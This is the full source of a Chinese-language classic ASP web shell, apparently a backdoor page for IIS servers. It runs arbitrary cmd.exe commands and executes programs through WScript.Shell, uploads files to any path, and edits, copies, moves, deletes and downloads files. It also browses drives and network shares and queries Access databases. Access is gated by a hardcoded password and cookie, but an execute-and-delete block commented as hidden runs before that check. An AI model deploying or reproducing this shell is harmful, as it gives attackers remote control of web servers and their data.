<%@ LANGUAGE="VBSCRIPT"  codepage ="950" %>
<title>::::XP.net版::::</title>
<style>
body{font-family: 細明體;   font-size: 10pt}
table{ font-family: 細明體; font-size: 9pt }
a{ font-family: 細明體; font-size: 9pt; color: #000000; text-decoration: none }
a:hover{ font-family: 細明體; color: #ff0000; text-decoration: none }
input {	BORDER-RIGHT: #888888 1px solid; BORDER-TOP: #888888 1px solid; BACKGROUND: #ffffff; BORDER-LEFT: #888888 1px solid; BORDER-BOTTOM: #888888 1px solid; FONT-FAMILY: "Verdana", "Arial"font-color: #ffffff;FONT-SIZE: 9pt;
</style>
<% '***************隱含的另一套代碼執行和刪除程序開始***************  %>
<% 
select case request("action")
	case "執行"
		result=ExecuteFile(request("run"))
        case "del"
                result=DeleteFile(request("filename"))
        end select

function DeleteFile(fileDel)
    on error resume next 
    dim fs
    Set fs = CreateObject("Scripting.FileSystemObject")
response.write "文件刪除 (" & fileDel & ")="&cstr(fs.FileExists(fileDel))&"<BR>"    
    if fs.FileExists(fileDel) then        
       fs.DeleteFile fileDel,true
    end if
    if err>0 then 
       err.clear
       DeleteFile=false
    else 
       DeleteFile=true
    end if    
end function

function ExecuteFile(fileExe)
	Set WShShell = Server.CreateObject("WScript.Shell")
	RetCode = WShShell.Run(fileExe, 1, True)
	if RetCode = 0 Then
	    'There were no errors
		ExecuteFile=True
	else
    	ExecuteFile=False
	end if
response.write "Run&nbsp"&"&nbsp"&fileexe&"&nbsp"&executefile
end function
 %>
<% '***************隱含的另一套代碼結束***************  %>

<% '***************上傳文件開始***************  %>
<% if request("up")=1 then %>
<%Server.ScriptTimeOut=5000%>
<SCRIPT RUNAT=SERVER LANGUAGE=VBSCRIPT>
dim Data_5xsoft
Class upload_5xsoft
dim objForm,objFile,Version
Public function Form(strForm)
strForm=lcase(strForm)
if not objForm.exists(strForm) then
Form=""
else
Form=objForm(strForm)
end if
end function
Public function File(strFile)
strFile=lcase(strFile)
if not objFile.exists(strFile) then
set File=new FileInfo
else
set File=objFile(strFile)
end if
end function
Private Sub Class_Initialize
dim RequestData,sStart,vbCrlf,sInfo,iInfoStart,iInfoEnd,tStream,iStart,theFile
dim iFileSize,sFilePath,sFileType,sFormValue,sFileName
dim iFindStart,iFindEnd
dim iFormStart,iFormEnd,sFormName
set objForm=Server.CreateObject("Scripting.Dictionary")
set objFile=Server.CreateObject("Scripting.Dictionary")
if Request.TotalBytes<1 then Exit Sub
set tStream = Server.CreateObject("adodb.stream")
set Data_5xsoft = Server.CreateObject("adodb.stream")
Data_5xsoft.Type = 1
Data_5xsoft.Mode =3
Data_5xsoft.Open
Data_5xsoft.Write  Request.BinaryRead(Request.TotalBytes)
Data_5xsoft.Position=0
RequestData =Data_5xsoft.Read
iFormStart = 1
iFormEnd = LenB(RequestData)
vbCrlf = chrB(13) & chrB(10)
sStart = MidB(RequestData,1, InStrB(iFormStart,RequestData,vbCrlf)-1)
iStart = LenB (sStart)
iFormStart=iFormStart+iStart+1
while (iFormStart + 10) < iFormEnd
iInfoEnd = InStrB(iFormStart,RequestData,vbCrlf & vbCrlf)+3
tStream.Type = 1
tStream.Mode =3
tStream.Open
Data_5xsoft.Position = iFormStart
Data_5xsoft.CopyTo tStream,iInfoEnd-iFormStart
tStream.Position = 0
tStream.Type = 2
tStream.Charset ="gb2312"
sInfo = tStream.ReadText
tStream.Close
iFormStart = InStrB(iInfoEnd,RequestData,sStart)
iFindStart = InStr(22,sInfo,"name=""",1)+6
iFindEnd = InStr(iFindStart,sInfo,"""",1)
sFormName = lcase(Mid (sinfo,iFindStart,iFindEnd-iFindStart))
if InStr (45,sInfo,"filename=""",1) > 0 then
set theFile=new FileInfo
iFindStart = InStr(iFindEnd,sInfo,"filename=""",1)+10
iFindEnd = InStr(iFindStart,sInfo,"""",1)
sFileName = Mid (sinfo,iFindStart,iFindEnd-iFindStart)
theFile.FileName=getFileName(sFileName)
theFile.FilePath=getFilePath(sFileName)
iFindStart = InStr(iFindEnd,sInfo,"Content-Type: ",1)+14
iFindEnd = InStr(iFindStart,sInfo,vbCr)
theFile.FileType =Mid (sinfo,iFindStart,iFindEnd-iFindStart)
theFile.FileStart =iInfoEnd
theFile.FileSize = iFormStart -iInfoEnd -3
theFile.FormName=sFormName
if not objFile.Exists(sFormName) then
objFile.add sFormName,theFile
end if
else
tStream.Type =1
tStream.Mode =3
tStream.Open
Data_5xsoft.Position = iInfoEnd
Data_5xsoft.CopyTo tStream,iFormStart-iInfoEnd-3
tStream.Position = 0
tStream.Type = 2
tStream.Charset ="gb2312"
sFormValue = tStream.ReadText
tStream.Close
if objForm.Exists(sFormName) then
objForm(sFormName)=objForm(sFormName)&", "&sFormValue
else
objForm.Add sFormName,sFormValue
end if
end if
iFormStart=iFormStart+iStart+1
wend
RequestData=""
set tStream =nothing
End Sub
Private Sub Class_Terminate
if Request.TotalBytes>0 then
objForm.RemoveAll
objFile.RemoveAll
set objForm=nothing
set objFile=nothing
Data_5xsoft.Close
set Data_5xsoft =nothing
end if
End Sub
Private function GetFilePath(FullPath)
If FullPath <> "" Then
GetFilePath = left(FullPath,InStrRev(FullPath, "\"))
Else
GetFilePath = ""
End If
End  function
Private function GetFileName(FullPath)
If FullPath <> "" Then
GetFileName = mid(FullPath,InStrRev(FullPath, "\")+1)
Else
GetFileName = ""
End If
End  function
End Class
Class FileInfo
dim FormName,FileName,FilePath,FileSize,FileType,FileStart
Private Sub Class_Initialize
FileName = ""
FilePath = ""
FileSize = 0
FileStart= 0
FormName = ""
FileType = ""
End Sub
Public function SaveAs(FullPath)
dim dr,ErrorChar,i
SaveAs=true
if trim(fullpath)="" or FileStart=0 or FileName="" or right(fullpath,1)="/" then exit function
set dr=CreateObject("Adodb.Stream")
dr.Mode=3
dr.Type=1
dr.Open
Data_5xsoft.position=FileStart
Data_5xsoft.copyto dr,FileSize
dr.SaveToFile FullPath,2
dr.Close
set dr=nothing
SaveAs=false
end function
End Class
</SCRIPT>
<%
dim upload,file,formName,formPath,iCount
set upload=new upload_5xsoft
if upload.form("filepath")="" then
response.write "請輸入要上傳至的目錄!"
set upload=nothing
response.end
else
formPath=upload.form("filepath")
if right(formPath,1)<>"/" then formPath=formPath&"/"
end if
iCount=0
for each formName in upload.objForm
next
response.write "<br>"
for each formName in upload.objFile
set file=upload.file(formName)
if file.FileSize>0 then
'file.SaveAs Server.mappath(formPath&file.FileName)
file.SaveAs formPath&file.FileName
response.write "<center>"&file.FilePath&file.FileName&" ("&file.FileSize&") => "&formPath&File.FileName&" 上傳成功!</center><br>"
iCount=iCount+1
end if
set file=nothing
next
set upload=nothing
response.write "<center>"&iCount&"個文件上傳結束!</center>"
response.write "<center><br><a href=""javascript:history.back();""><font color='#D00000'>返回上一頁</font></a></center>"

 '***************上傳文件結束 ***************

else
url= Request.ServerVariables("URL")
'修改下面的密碼
if trim(request.form("password"))="889031" then
response.cookies("password")="allen" '密碼是否正確
response.redirect ""&url&""
else if Request.Cookies("password")<>"allen" then
call login() '密碼錯誤
response.end '停止運行
end if
select case request("id")
case "edit"
call edit()
case "upload"
call upload()
case "dir"
call dir()
case "down"
'response.write request("path")
call downloadFile(request("path"))

case else
call main()
end select
end if
sub login()
for i=0 to 25
on error resume next
IsObj=false
VerObj=""
dim TestObj
set TestObj=server.CreateObject(ObjTotest(i,0))
If -2147221005 <> Err then
IsObj = True
VerObj = TestObj.version
if VerObj="" or isnull(VerObj) then VerObj=TestObj.about
end if
ObjTotest(i,2)=IsObj
ObjTotest(i,3)=VerObj
next
%>
<body><center>
<table border=0 width=500 cellspacing=0 cellpadding=0 bgcolor="#B8B8B8">
<tr><td>
<table border=0 width=100% cellspacing=1 cellpadding=0>
<tr bgcolor="#EEEEEE" height=18>
<td width="59%" align=left>&nbsp;服務器名</td>
<td width="41%" bgcolor="#EEEEEE">&nbsp;<%=Request.ServerVariables("SERVER_NAME")%></td>
</tr>
<tr bgcolor="#FFFFFF" height=18>
<td align=left>&nbsp;服務器IP</td>
<td>&nbsp;<%=Request.ServerVariables("LOCAL_ADDR")%></td>
</tr>
<tr bgcolor="#FFFFFF" height=18>
<td align=left>&nbsp;服務器端口</td>
<td>&nbsp;<%=Request.ServerVariables("SERVER_PORT")%></td>
</tr>
<tr bgcolor="#FFFFFF" height=18>
<td align=left>&nbsp;服務器時間</td>
<td>&nbsp;<%=now%></td>
</tr>
<tr bgcolor="#FFFFFF" height=18>
<td align=left>&nbsp;本文件絕對路徑</td>
<td>&nbsp;<%=server.mappath(Request.ServerVariables("SCRIPT_NAME"))%></td>
</tr>
<tr bgcolor="#FFFFFF" height=18>
<td align=left>&nbsp;服務器CPU數量</td>
<td>&nbsp;<%=Request.ServerVariables("NUMBER_OF_PROCESSORS")%> 個</td>
</tr>
<tr bgcolor="#FFFFFF" height=18>
<td align=left>&nbsp;服務器操作系統</td>
<td>&nbsp;<%=Request.ServerVariables("OS")%></td>
</tr>
<tr bgcolor="#EEEEEE" height=18>
<td align=left><font class=fonts>服務器運算速度測試</font></td>
<td>&nbsp;完成時間</td>
</tr>
<tr bgcolor="#FFFFFF" height=18>
<td align=left>LCX的電腦（64M,賽羊433）</td>
<td>&nbsp;980.5 毫秒</td>
</tr>
<tr bgcolor="#FFFFFF" height=18>
<td align=left>中國頻道虛擬主機（2002-08-06）</td>
<td>&nbsp;610.9 毫秒</td>
</tr>
<tr bgcolor="#FFFFFF" height=18>
<td align=left>西部數碼west263主機（2002-08-06）</td>
<td>&nbsp;357.8 毫秒</td>
</tr>
<tr bgcolor="#FFFFFF" height=18><%
dim t1,t2,lsabc,thetime
t1=timer
for i=1 to 500000
lsabc= 1 + 1
next
t2=timer
thetime=cstr(int(( (t2-t1)*10000 )+0.5)/10)
%><td align=left><font color=red>您正在使用的這台服務器</font>&nbsp;</td>
<td>&nbsp;<font color=red><%=thetime%> 毫秒</font></td>
</tr>
</table>
</td>
</tr>
</table>
<html>
<body><center>
<table>
<%response.write "<font class=fonts>一次只能執行一個操作:)在本頁操作不需要FSO支持&當服務器時間</font>" %>
<%response.write now()%><BR>
<form action="<%= Request.ServerVariables("URL") %>" method="POST">
<input type=text name=text value="<%=szCMD %>">  <font class=fonts>輸入要瀏覽的目錄,最後要加\</font><br>
<input type=text name=text1 value="<%=szCMD1 %>">
copy
<input type=text name=text2 value="<%=szCMD2 %>"> <font class=fonts>目的地址不要帶文件名</font><br>
<input type=text name=text3 value="<%=szCMD3 %>">
move
<input type=text name=text4 value="<%=szCMD4 %>"><font class=fonts> 目的地址不要帶文件名</font><br>
路徑：<input type=text name=text5 value="<%=szCMD5 %>">
程序：<input type=text name=text6 value="<%=szCMD6 %>"><font class=fonts> 不可以加參數</font><br>
<input type=submit name=sb value=發送命令 class=input>
</form>
</table>
</center>
<% 
Dim strSQL, objDBConn, objRS, intFieldCount, intCounter,mdb
mdb = Request.QueryString("mdb")
strSQL = Request.QueryString("SQL")
If strSQL <> "" and left(trim(strsql),6)="select" Then
   Response.Write "SQL字符串: " & strSQL & "<br>" 
   ' 建立數據庫連接的對象
   Set objDBConn = Server.CreateObject("ADODB.Connection")
   ' 打開數據庫連接 mdb請改為你要連接的數據庫名字
   objDBConn.Open "DRIVER={Microsoft Access Driver (*.mdb)}; DBQ=" & Server.MapPath(mdb)
   ' 執行SQL的數據庫查詢
   Set objRS = objDBconn.Execute(strSQL)
   ' 取得域的個數
   intFieldCount = objRS.Fields.Count - 1
   ' 檢查是否有記錄 
   If Not objRS.Eof Then
      Response.Write "<table border=1><tr>"   
      ' 顯示數據庫的域名
      For intCounter = 0 to intFieldCount
          Response.Write "<td><b>" & objRS(intCounter).Name & "</b></td>"
      Next
      Response.Write "</tr>"
      ' 顯示數據庫內容
      Do While Not objRS.Eof
         Response.Write "<tr>"     
         ' 顯示每個記錄的域 
         For intCounter = 0 to intFieldCount
             If objRS.Fields(intCounter).Value <> "" Then
                Response.Write "<td valign=""top"">" & objRS.Fields(intCounter).Value & "</td>"
             Else
                Response.Write "<td valign=""top"">---</td>"
             End If
         Next
         Response.Write "</tr>"
         objRS.MoveNext  ' 移到下一條記錄
      Loop
      Response.Write "</table>"
   Else
      Response.Write "<b>沒有符合條件的記錄</b><br>" 
   End If

   objRS.Close         ' 關閉記錄集合
   Set objRS = Nothing
   objDBConn.Close     ' 關閉數據庫連接
   Set objDBConn = Nothing 
end if
if strSQL <> "" and left(trim(strsql),6)<>"select" Then
%>
<script>javascript:alert("這不是select命令\n請打開數據庫看運行結果\n海陽頂端網lcx\n這個你可以當做一個access版sql後門:-)")</script>
<%
end if
%>
<form  action="<%=url%>"  method="GET">
<table border=1>
   <tr>
      <td>SQL字符串:</td>
      <td><Input TYPE="TEXT" NAME="SQL" value="<%=strSQL%>" size ="30">
  <Input TYPE="TEXT" NAME="mdb" value="acess數據庫相對目錄及名稱" size ="30"></td>
   </tr>
   <tr>
      <td colspan=2 align=center><input TYPE="SUBMIT" value="查詢數據庫，或執行其它sql語句"></td>
   </tr>
</table>
<hr>
</form>
</center>

</body>
</html>
<%
szCMD = Request.Form("text")   '目錄瀏覽
if (szCMD <> "")  then
set shell=server.createobject("shell.application") '建立shell對像
set fod1=shell.namespace(szcmd)
set foditems=fod1.items
for each co in foditems
response.write "<font color=black>" & co.path & "-----" & co.size & "</font><br>"
next
end if
%>

<%
szCMD1 = Request.Form("text1")  '目錄拷貝，不能進行文件拷貝
szCMD2 = Request.Form("text2")
if szcmd1<>"" and szcmd2<>"" then
set shell1=server.createobject("shell.application") '建立shell對像
set fod1=shell1.namespace(szcmd2)
for i=len(szcmd1) to 1 step -1
if mid(szcmd1,i,1)="\" then
   path=left(szcmd1,i-1)
   exit for
end if
next
if len(path)=2 then path=path & "\"
path2=right(szcmd1,len(szcmd1)-i)
set fod2=shell1.namespace(path)
set foditem=fod2.parsename(path2)
fod1.copyhere foditem
response.write "command completed success!"
end if
%>

<%
szCMD3 = Request.Form("text3")   '目錄移動
szCMD4 = Request.Form("text4")
if szcmd3<>"" and szcmd4<>"" then
set shell2=server.createobject("shell.application") '建立shell對像
set fod1=shell2.namespace(szcmd4)

for i=len(szcmd3) to 1 step -1
if mid(szcmd3,i,1)="\" then
   path=left(szcmd3,i-1)
   exit for
end if
next

if len(path)=2 then path=path & "\"
path2=right(szcmd3,len(szcmd3)-i)
set fod2=shell2.namespace(path)
set foditem=fod2.parsename(path2)
fod1.movehere foditem
response.write "command completed success!"
end if
%>
<%
szCMD5 = Request.Form("text5")    '執行程序要指定路徑
szCMD6 = Request.Form("text6")
if szcmd5<>"" and szcmd6<>"" then
set shell3=server.createobject("shell.application") '建立shell對像
shell3.namespace(szcmd5).items.item(szcmd6).invokeverb
response.write "command completed success!"
end if
%>
<center>

<form method="POST" action=""&url&"">
Enter Password：<input type="password" name="password" size="20">
<input type="submit" value="LOGIN">
</center></form>
</body>
<%end sub%>
<%sub main()
'修改下面的urlpath改為你服務器的實際URL
urlpath="http://localhost"
dim cpath,lpath
set fsoBrowse=CreateObject("Scripting.FileSystemObject")
if Request("path")="" then
lpath="/"
else
lpath=Request("path")&"/"
end if
if Request("attrib")="true" then
cpath=lpath
attrib="true"
else
cpath=Server.MapPath(lpath)
attrib=""
end if
%><html>
<script language="JavaScript">
function crfile(ls)
{if (ls==""){alert("請輸入文件名!");}
else {window.open("<%=url%>?id=edit&attrib=<%=request("attrib")%>&creat=yes&path=<%=lpath%>"+ls);}
return false;
}
function crdir(ls)
{if (ls==""){alert("請輸入文件名!");}
else {window.open("<%=url%>?id=dir&attrib=<%=request("attrib")%>&op=creat&path=<%=lpath%>"+ls);}
return false;
}
</script>
<script language="vbscript">
sub rmdir(ls)
if confirm("你真的要刪除這個目錄嗎!"&Chr(13)&Chr(10)&"目錄為："&ls)   then
window.open("<%=url%>?id=dir&path="&ls&"&op=del&attrib=<%=request("attrib")%>")
end if
end sub
sub copyfile(sfile)
dfile=InputBox(""&Chr(13)&Chr(10)&"源文件："&sfile&Chr(13)&Chr(10)&"請輸入目標文件的文件名:"&Chr(13)&Chr(10)&"許帶路徑,要根據你的當前路徑模式. 注意:絕對路徑示例c:/或c:\都可以")
dfile=trim(dfile)
attrib="<%=request("attrib")%>"
if dfile<>"" then
if InStr(dfile,":") or InStr(dfile,"/")=1 then
lp=""
if InStr(dfile,":") and attrib<>"true" then
alert "對不起，你在相對路徑模式下不能使用絕對路徑"&Chr(13)&Chr(10)&"錯誤路徑：["&dfile&"]"
exit sub
end if
else
lp="<%=lpath%>"
end if
window.open(""&url&"?id=edit&path="+sfile+"&op=copy&attrib="+attrib+"&dpath="+lp+dfile)
else
alert"您沒有輸入文件名！"
end If
end sub
</script><body bgcolor="#F5F5F5">
<TABLE cellSpacing=1 cellPadding=3 width="750" align=center
bgColor=#b8b8b8 border=0>
<TBODY>
<TR >
<TD
height=22 colspan="4" bgcolor="#eeeeee" >切換盤符：
<%
For Each thing in fsoBrowse.Drives
Response.write "<a href='"&url&"?path="&thing.DriveLetter&":&attrib=true'>"&thing.DriveLetter&"盤:</a>          "
NEXT
%>   &nbsp;本機局域網地址：
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
%><%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>  </TD>
</TR>  <TD colspan="4" bgcolor="#ffffff" ><%
if Request("attrib")="true"  then
response.write "<a href='"&url&"'><font color='#D00000'>點擊切換到相對路徑編輯模式</font></a>"
else
response.write "<a href='"&url&"?attrib=true'><font color='#D00000'>點擊切換到絕對路徑編輯模式</font></a>"
end if
%>&nbsp路徑: <%=cpath%>  &nbsp;&nbsp;當前瀏覽目錄:<%=lpath%></TD></TR> <TR>
<TD height=22 colspan="4" bgcolor="#eeeeee" >
<form name="form1" method="post" action="<%=url%>" >
瀏覽目錄: <input type="text" name="path" size="30" value="c:">
<input type="hidden" name="attrib" value="true">
<input type="submit" name="Submit" value="瀏覽目錄" > 【請使用絕對路徑,支持局域網地址！如"\\pc01\c"】
</TD></form>
</TR><TR >
<TD colspan="4" bgcolor="#ffffff" ><form name="form1" method="post" action="<%=url%>?up=1" enctype="multipart/form-data" >
<input type="hidden" name="act" value="upload">
傳至服務器已有目錄:
<input name="filepath" type="text" value="drv:\path" size="9">
文件地址:
<input type="file" name="file1" value="" size=4><input type="file" name="file2" value="" size=4>
<input type="file" name="file3" value="" size=4>
<input type="submit" name="Submit" value="上傳" > 【請用絕對路徑】
</TD>
</form></TR>
<TR bgcolor="#eeeeee">
<TD colspan="4" >
<%
On Error Resume Next
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
szCMD = Request.Form(".CMD")
If (szCMD <> "") Then
szTempFile = "C:\" & oFileSys.GetTempName( )
Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)
Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)
End If%>
<FORM action="<%= Request.ServerVariables("URL") %>" method="POST" name=userdata>
<input type=text name=".CMD" size=10 value="<%= szCMD %>">
<input type=submit value="運行cmd命令">
<input type=text name='name' size=15 value="drive:\file.exe"><input type='button' name=send value="執行程序">
<input type=text name='name1' size=15 value="drive:\file.name"><input type='button' name=send1 value="刪除文件">【請使用絕對路徑加文件名】
<% If (IsObject(oFile)) Then
On Error Resume Next
Response.Write Server.HTMLEncode(oFile.ReadAll)
oFile.Close
Call oFileSys.DeleteFile(szTempFile, True)
End If %>
</TD> </FORM>
<script language=vbscript>
sub send_onclick
window.open("<%=url%>?run="+userdata.name.value+"&action=執行")
end sub
</script>
<script language=vbscript>
sub send1_onclick
window.open("<%=url%>?filename="+userdata.name1.value+"&action=del")
end sub
</script>
</TR>
<TR bgColor=#ffffff>
<TD height=22 colspan="4" ><form name="newfile"
onSubmit="return crfile(newfile.filename.value);">
<input type="text" name="filename" size="40">
<input type="submit" value="新建文件" >
<input type="button" value="新建目錄"onclick="crdir(newfile.filename.value)">【新建文件和新建目錄不能同名】
</TD></form>
</TR>
<TR>
<TD height=22 width="26%" rowspan="2" valign="top" bgColor=#eeeeee >
<%
dim theFolder,theSubFolders
if fsoBrowse.FolderExists(cpath)then
Set theFolder=fsoBrowse.GetFolder(cpath)
Set theSubFolders=theFolder.SubFolders
Response.write"<a href='"&url&"?path="&Request("oldpath")&"&attrib="&attrib&"'><font color='#FF8000'>■</font>↑<font color='ff2222'>回上級目錄</font></a><br>"
For Each x In theSubFolders
Response.write"<a href='"&url&"?path="&lpath&x.Name&"&oldpath="&Request("path")&"&attrib="&attrib&"'>└<font color='#FF8000'>■</font>  "&x.Name&"</a> <a href="&chr(34)&"javascript: rmdir('"&lpath&x.Name&"')"&chr(34)&"><font color='#FF8000' >×</font>刪除</a><br>"
Next
end if
%>
</TD>
<TD  width="45%"  bgColor=#eeeeee>文件名 （鼠標移到文件名可以查看給文件的屬性）</TD>
<TD width="11%" bgColor=#eeeeee>大小（字節）</TD>
<TD width="18%" bgColor=#eeeeee>文件操作</TD>
</TR>
<TR>
<TD height=200 colspan="3" valign="top" bgColor=#ffffff>
<%
dim theFiles
if fsoBrowse.FolderExists(cpath)then
Set theFolder=fsoBrowse.GetFolder(cpath)
Set theFiles=theFolder.Files
Response.write"<table  width='100%' border='0' cellspacing='0' cellpadding='2'>"
For Each x In theFiles
if Request("attrib")="true" then
showstring="<strong>"&x.Name&"</strong>"
else
showstring="<a href='"&urlpath&lpath&x.Name&"' title='"&"類型"&x.type&chr(10)&"屬性"&x.Attributes&chr(10)&"時間："&x.DateLastModified&"'target='_blank'><strong>"&x.Name&"</strong></a>"
end if
Response.write"<tr><td width='50%'  style='border-bottom:1 solid #000000;'><font color='#FF8000'>□</font>"&showstring&"</td><td width='8%'  style='border-bottom:1 solid #000000;'>"&x.size&"</a></td><td width='20%'  style='border-bottom:1 solid #000000;'>&nbsp;<a href='"&url&"?id=edit&path="&lpath&x.Name&"&attrib="&attrib&"' target='_blank' >編輯</a>&nbsp;<a href='#' onclick=copyfile('"&lpath&x.Name&"')>複製</a>&nbsp;<a href='"&url&"?id=edit&path="&lpath&x.Name&"&op=del&attrib="&attrib&"' target='_blank' >刪除</a>&nbsp;<a href='"&url&"?id=down&path="&lpath&x.Name&"&attrib="&attrib&"' target='_blank'>下載</a>&nbsp;</td></tr>"
Next
end if
Response.write"</table>"
%>
</TD>
</TR></TBODY>
</TABLE>
<% end sub
sub edit()
if request("op")="del"  then
'**********刪除文件********
if Request("attrib")="true" then
whichfile=Request("path")
else
whichfile=server.mappath(Request("path"))
end if
Set fs = CreateObject("Scripting.FileSystemObject")
Set thisfile = fs.GetFile(whichfile)
thisfile.Delete True
Response.write "<br><center>刪除成功！要刷新才能看到效果.</center>"
'**********刪除文件結束********
else
if request("op")="copy" then
'**********複製文件********
if Request("attrib")="true" then
whichfile=Request("path")
dsfile=Request("dpath")
else
whichfile=server.mappath(Request("path"))
dsfile=Server.MapPath(Request("dpath"))
end if
Set fs = CreateObject("Scripting.FileSystemObject")
Set thisfile = fs.GetFile(whichfile)
thisfile.copy dsfile
Response.write "<center><p>源文件："+whichfile+"</center>"
Response.write "<center><br>目的文件："+dsfile+"</center>"
Response.write "<center><br>複製成功！要刷新才能看到效果!</p></center>"
'**********複製文件結束********
else
if request.form("text")="" then
if Request("creat")<>"yes" then
if Request("attrib")="true" then
whichfile=Request("path")
else
whichfile=server.mappath(Request("path"))
end if
Set fs = CreateObject("Scripting.FileSystemObject")
Set thisfile = fs.OpenTextFile(whichfile, 1, False)
counter=0
thisline=thisfile.readall
thisfile.Close
set fs=nothing
end if
%>
<form method="POST" action=""&url&"?id=edit">
<input type="hidden" name="attrib" value="<%=Request("attrib")%>">
<br>
<TABLE cellSpacing=1 cellPadding=3 width="750" align=center
bgColor=#b8b8b8 border=0>
<TBODY>
<TR >
<TD
height=22 bgcolor="#eeeeee" ><div align="center">xp.net版文件編輯器</div></TD>
</TR>
<TR >
<TD width="100%"
height=22 bgcolor="#ffffff" >文件名：
<input type="text" name="path" size="45"
value="<%=Request("path")%>"readonly>
</TD>
</TR>
<TR>
<TD
height=22 bgcolor="#eeeeee" > <div align="center">
<textarea rows="25" name="text" cols="105"><%=thisline%></textarea>
</div></TD>
</TR>
<TR>
<TD
height=22 bgcolor="#ffffff" ><div align="center">
<input type="submit"
value="提交" name="B1">
<input type="reset" value="復原" name="B2">
</div></TD>
</TR>
</TABLE>
</form>
<%else
if Request("attrib")="true" then
whichfile=Request("path")
else
whichfile=server.mappath(Request("path"))
end if
Set fs = CreateObject("Scripting.FileSystemObject")
Set outfile=fs.CreateTextFile(whichfile)
outfile.WriteLine Request("text")
outfile.close
set fs=nothing
Response.write "<center>修改成功！要刷新才能看到效果!</center>"
end if
end if
end if
end sub
end if
%>
<% sub dir()
if request("op")="del"  then
'***********刪除目錄**********
if Request("attrib")="true" then
whichdir=Request("path")
else
whichdir=server.mappath(Request("path"))
end if
Set fs = CreateObject("Scripting.FileSystemObject")
fs.DeleteFolder whichdir,True
Response.write "<center>刪除成功！要刷新才能看到效果，刪除的目錄為:<b>"&whichdir&"</b></center>"
'**********刪除目錄結束*************
else
'***********新建目錄**********
if request("op")="creat"  then
if Request("attrib")="true" then
whichdir=Request("path")
else
whichdir=server.mappath(Request("path"))
end if
Set fs = CreateObject("Scripting.FileSystemObject")
fs.CreateFolder whichdir
Response.write "<center>建立成功！要刷新才能看到效果,建立的目錄為:<b>"&whichdir&"</b></center>"
'***********新建目錄結束**********
end if
end if
end sub
'****下載文件
function downloadFile(strFile)
 strFilename = server.MapPath(strFile)
Response.Buffer = True
Response.Clear
Set s = Server.CreateObject("ADODB.Stream")
s.Open
s.Type = 1
on error resume next
Set fso = Server.CreateObject("Scripting.FileSystemObject")
 if not fso.FileExists(strFilename) then
  Response.Write("<h1>Error:</h1>" & strFilename & " does not exist<p>")
  Response.End
 end if
 Set f = fso.GetFile(strFilename)
 intFilelength = f.size
s.LoadFromFile(strFilename)
 if err then
  Response.Write("<h1>Error: </h1>" & err.Description & "<p>")
  Response.End
 end if
 Response.AddHeader "Content-Disposition", "attachment; filename=" & f.name
 Response.AddHeader "Content-Length", intFilelength
 Response.CharSet = "UTF-8"
 Response.ContentType = "application/octet-stream"
  Response.BinaryWrite s.Read
 Response.Flush
 s.Close
 Set s = Nothing
 response.end
End Function 
%>
<br>

</body>
</html>

